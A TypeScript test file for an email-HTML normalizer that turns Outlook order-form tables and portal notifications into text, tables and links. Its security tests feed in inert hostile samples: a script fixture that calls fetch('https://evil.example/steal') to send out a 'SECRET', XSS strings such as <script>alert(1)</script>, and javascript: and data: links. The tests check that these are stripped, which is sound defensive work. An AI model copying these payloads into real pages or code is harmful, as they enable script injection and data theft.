/**
 * The email-body normalizer, exercised on the SHAPES that broke production.
 *
 * Every fixture here is hand-built and ANONYMISED. They are modelled on two real
 * messages — an Outlook standing order form exported as one `MsoNormalTable` of
 * 100 rows × 4 columns, and a procurement-portal notification whose body is a
 * tracking-wrapped link and nothing else — but the products, people, hosts and
 * tokens are invented. Nothing customer-identifying is committed.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import {
  buildNormalizedReaderSource,
  normalizeEmailHtml,
  serializeNormalizedTables,
} from '../lib/platform/docu/email-html-normalizer.ts';

/** Outlook writes cell text as a bold span inside a `MsoNormal` paragraph. */
function cell(value: string, bold = false): string {
  const inner = value === ''
    ? '<span style="font-size:10.0pt; font-family:&quot;Verdana&quot;,sans-serif">&nbsp;</span>'
    : `<span style="font-size:10.0pt; font-family:&quot;Verdana&quot;,sans-serif">${value}</span>`;
  return `<td width="214" nowrap="" style="width:160.3pt; border:solid windowtext 1.0pt; padding:0in 5.4pt 0in 5.4pt"><p class="MsoNormal">${
    bold ? `<b>${inner}</b>` : inner
  }</p></td>`;
}

function row(cells: readonly string[], bold = false): string {
  return `<tr style="height:24.0pt">${cells.map((value) => cell(value, bold)).join('')}</tr>`;
}

/**
 * The standing-order-form shape: a full product list with an "order" column the
 * customer fills in for the few things they want. 100 rows, 4 columns, 8 of them
 * ordered — three of those written as gram weights, which is exactly what the
 * server-flattened read used to lose.
 */
const ORDERED_ROWS: readonly [string, string, string][] = [
  ['Carrots Baby', 'pkts', '1'],
  ['Broccoli Heads', 'UNIT', '3'],
  ['Coriander Fresh', 'KG', '200g'],
  ['Mint Fresh', 'KG', '100g'],
  ['Parsley Flat Leaf', 'KG', '300g'],
  ['Patty Pans Yellow', 'UNIT', '1'],
  ['Potatoes Large', 'BAG', '2'],
  ['Strawberries Fresh', 'UNIT', '1'],
];

function orderFormBody(): string {
  const rows: string[] = [row(['Item', 'UNIT', 'stock', 'order'], true)];
  const ordered = new Map<number, [string, string, string]>();
  ORDERED_ROWS.forEach((entry, index) => ordered.set(6 + index * 11, entry));
  for (let i = 0; i < 99; i += 1) {
    const hit = ordered.get(i);
    if (hit) rows.push(row([hit[0], hit[1], '', hit[2]]));
    else rows.push(row([`Filler Product ${i + 1}`, i % 2 ? 'kg' : 'BOX', '', '']));
  }
  return `<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><style><!--
p.MsoNormal { margin:0in; font-size:11.0pt }
--></style></head><body lang="EN-US" style="word-wrap:break-word"><div class="WordSection1"><table class="MsoNormalTable" border="0" cellspacing="0" cellpadding="0" width="369" style="width:276.65pt; border-collapse:collapse"><tbody>${rows.join('')}</tbody></table><p class="MsoNormal">Kind Regards</p><p class="MsoNormal">Dana Kruger</p><p class="MsoNormal">Kitchen Manager</p></div></body></html>`;
}

/** The portal-notification shape: metadata, a wrapped link, a tracking pixel. */
const PORTAL_BODY = `<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body>Property: Riverbend <br>Reference Buyer PO number: RVB0044219<br><br>Sent By:<br>Dana Kruger<br><br>Riverbend<br>dana.kruger@riverbend-hotels.example<br><br>TO EDIT THE DOCUMENT CLICK THE BELOW LINK<br><br><a href="https://links.mailer-example.net/ls/click?upn=EXAMPLE-TOKEN-0000">http://riverbend.birchstreet.net</a><img src="https://links.mailer-example.net/wf/open?upn=EXAMPLE-TOKEN-0000" alt="" width="1" height="1" border="0" style="height:1px!important; width:1px!important"></body></html>`;

test('the standing order form survives as a grid: 99 rows, 4 columns, 8 of them ordered', () => {
  const normalized = normalizeEmailHtml(orderFormBody());
  assert.equal(normalized.tables.length, 1);
  const table = normalized.tables[0];
  assert.deepEqual(table.headers, ['Item', 'UNIT', 'stock', 'order']);
  assert.equal(table.rows.length, 99);
  assert.ok(table.rows.every((cells) => cells.length === 4), 'every row keeps all four columns');

  const ordered = table.rows.filter((cells) => cells[3] !== '');
  assert.equal(ordered.length, 8, 'exactly the rows the customer wrote in');
  assert.deepEqual(
    ordered.map((cells) => [cells[0], cells[1], cells[3]]),
    ORDERED_ROWS.map((entry) => [entry[0], entry[1], entry[2]]),
  );
  // The three gram quantities are the ones the flattened read dropped entirely.
  assert.deepEqual(
    ordered.filter((cells) => /g$/.test(cells[3])).map((cells) => cells[3]),
    ['200g', '100g', '300g'],
  );
  // The empty "stock" column stays empty rather than becoming a stray value.
  assert.ok(table.rows.every((cells) => cells[2] === ''));
});

test('an &nbsp;-only Outlook cell reads as empty, not as an unknown quantity', () => {
  const normalized = normalizeEmailHtml(
    `<table><tr><td>A</td><td>&nbsp;</td></tr><tr><td>B</td><td>&#160;</td></tr><tr><td>C</td><td>2</td></tr></table>`,
  );
  assert.deepEqual(normalized.tables[0].rows, [['A', ''], ['B', ''], ['C', '2']]);
});

test('the reader serialization is pipe-delimited, one row per line, empties preserved', () => {
  const normalized = normalizeEmailHtml(
    `<table><tr><th>Item</th><th>UNIT</th><th>order</th></tr>` +
    `<tr><td>Carrots Baby</td><td>pkts</td><td>1</td></tr>` +
    `<tr><td>Filler Product 2</td><td>kg</td><td>&nbsp;</td></tr></table>`,
  );
  assert.equal(
    serializeNormalizedTables(normalized.tables),
    'Table 1\nHEADERS: Item | UNIT | order\nROW: Carrots Baby | pkts | 1\nROW: Filler Product 2 | kg | ',
  );
});

test('the reader source carries the prose once and the rows once — never the cells twice', () => {
  const source = buildNormalizedReaderSource(normalizeEmailHtml(orderFormBody()));
  assert.match(source, /Kind Regards/);
  assert.match(source, /ROW: Carrots Baby \| pkts \|  \| 1/);
  assert.equal(source.split('Carrots Baby').length - 1, 1, 'the product appears exactly once');
});

test('entities decode, and a decoded character cannot re-enter the parser as markup', () => {
  const normalized = normalizeEmailHtml(
    `<p>Beans &amp; Peas &#39;fine&#39; &quot;grade A&quot; &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;</p>`,
  );
  assert.equal(normalized.text, `Beans & Peas 'fine' "grade A" <script>alert(1)</script>`);
  assert.equal(normalized.tables.length, 0);
});

test('script and style content never reaches text, tables or links', () => {
  const normalized = normalizeEmailHtml(
    `<html><head><style>.x { color: red }</style></head><body>` +
    `<script>var stolen = "SECRET"; fetch("https://evil.example/steal");</script>` +
    `<style>.y { background: url(https://evil.example/pixel) }</style>` +
    `<p>Please deliver 5 boxes tomatoes</p></body></html>`,
  );
  assert.equal(normalized.text, 'Please deliver 5 boxes tomatoes');
  assert.ok(!normalized.text.includes('SECRET'));
  assert.ok(!normalized.text.includes('evil.example'));
  assert.equal(normalized.links.length, 0);
});

test('elements hidden by CSS are dropped subtree and all', () => {
  const normalized = normalizeEmailHtml(
    `<div style="display:none"><p>hidden preheader text</p><table><tr><td>ghost</td><td>9</td></tr></table></div>` +
    `<div style="mso-hide:all">outlook only</div>` +
    `<span style="visibility:hidden">invisible</span>` +
    `<td style="font-size:0">zero</td>` +
    `<p>5 boxes tomatoes</p>`,
  );
  assert.equal(normalized.text, '5 boxes tomatoes');
  assert.equal(normalized.tables.length, 0);
});

test('line-height:0 is not display:none — a visible cell must not vanish', () => {
  const normalized = normalizeEmailHtml(`<p style="line-height:0; font-size:11pt">Carrots Baby 2 boxes</p>`);
  assert.equal(normalized.text, 'Carrots Baby 2 boxes');
});

test('only http/https links are surfaced, with the host parsed locally', () => {
  const normalized = normalizeEmailHtml(
    `<a href="javascript:alert(1)">a</a>` +
    `<a href="data:text/html;base64,PHNjcmlwdD4=">b</a>` +
    `<a href="mailto:dana.kruger@riverbend-hotels.example">c</a>` +
    `<a href="/relative/path">d</a>` +
    `<a href="https://Riverbend.BirchStreet.net/po/44219">the portal</a>`,
  );
  assert.deepEqual(normalized.links, [
    { href: 'https://Riverbend.BirchStreet.net/po/44219', text: 'the portal', host: 'riverbend.birchstreet.net' },
  ]);
});

test('the portal notification yields metadata, one link and no order rows', () => {
  const normalized = normalizeEmailHtml(PORTAL_BODY);
  assert.equal(normalized.tables.length, 0);
  assert.equal(normalized.links.length, 1);
  assert.equal(normalized.links[0].host, 'links.mailer-example.net');
  assert.equal(normalized.links[0].text, 'http://riverbend.birchstreet.net');
  assert.match(normalized.text, /Reference Buyer PO number: RVB0044219/);
  // The tracking pixel is an <img>: there is nothing here that could load it.
  assert.ok(!normalized.text.includes('wf/open'));
});

test('nested layout tables keep the inner line grid intact', () => {
  const normalized = normalizeEmailHtml(
    `<table><tr><td><table>` +
    `<tr><th>#</th><th>Item SKU</th><th>Product Desc.</th><th>Qty</th><th>UOM</th></tr>` +
    `<tr><td>1</td><td>VG-101</td><td>Melon Sweet</td><td>6.00</td><td>KG</td></tr>` +
    `<tr><td>2</td><td>VG-102</td><td>Melon Green</td><td>4.00</td><td>KG</td></tr>` +
    `</table></td></tr></table>`,
  );
  const grid = normalized.tables.find((table) => table.headers?.[0] === '#');
  assert.ok(grid, 'the inner grid is not swallowed by the outer table');
  assert.deepEqual(grid.headers, ['#', 'Item SKU', 'Product Desc.', 'Qty', 'UOM']);
  assert.deepEqual(grid.rows, [
    ['1', 'VG-101', 'Melon Sweet', '6.00', 'KG'],
    ['2', 'VG-102', 'Melon Green', '4.00', 'KG'],
  ]);
});

test('a spacer row is layout, never a line — and never a fake header', () => {
  const normalized = normalizeEmailHtml(
    `<table><tr><td></td></tr>` +
    `<tr><td>#</td><td>Product</td><td>Qty</td></tr>` +
    `<tr><td>1</td><td>Melon Sweet</td><td>6</td></tr>` +
    `<tr><td>2</td><td>Melon Green</td><td>4</td></tr></table>`,
  );
  assert.deepEqual(normalized.tables[0].headers, ['#', 'Product', 'Qty']);
  assert.equal(normalized.tables[0].rows.length, 2);
});

test('malformed markup degrades instead of throwing', () => {
  for (const broken of [
    '<table><tr><td>Carrots<td>2<tr><td>Beans<td>3',
    '<table><tr><td>unterminated everything',
    '<p>text with a <broken tag and <<< stray angle brackets',
    '<div style="display:none"><p>never closed',
    '<table><tr><td><table><tr><td>deep',
  ]) {
    assert.doesNotThrow(() => normalizeEmailHtml(broken));
  }
  const recovered = normalizeEmailHtml('<table><tr><td>Carrots<td>2<tr><td>Beans<td>3');
  assert.deepEqual(recovered.tables[0].rows, [['Carrots', '2'], ['Beans', '3']]);
  assert.deepEqual(normalizeEmailHtml('').tables, []);
  assert.equal(normalizeEmailHtml(null).text, '');
});

test('input is capped and output stays bounded', () => {
  const huge = `<p>${'x'.repeat(2_000_000)}</p>`;
  const normalized = normalizeEmailHtml(huge);
  assert.ok(normalized.text.length <= 200_000);
  const manyRows = `<table>${'<tr><td>a</td><td>b</td></tr>'.repeat(2_000)}</table>`;
  assert.ok(normalizeEmailHtml(manyRows).tables[0].rows.length <= 500);
});

test('normalising never performs a network call', async () => {
  const realFetch = globalThis.fetch;
  let calls = 0;
  globalThis.fetch = (async () => {
    calls += 1;
    throw new Error('the normalizer must never fetch anything');
  }) as typeof fetch;
  try {
    normalizeEmailHtml(PORTAL_BODY);
    normalizeEmailHtml(orderFormBody());
    normalizeEmailHtml('<img src="https://evil.example/pixel"><link rel="stylesheet" href="https://evil.example/x.css">');
  } finally {
    globalThis.fetch = realFetch;
  }
  assert.equal(calls, 0);
});
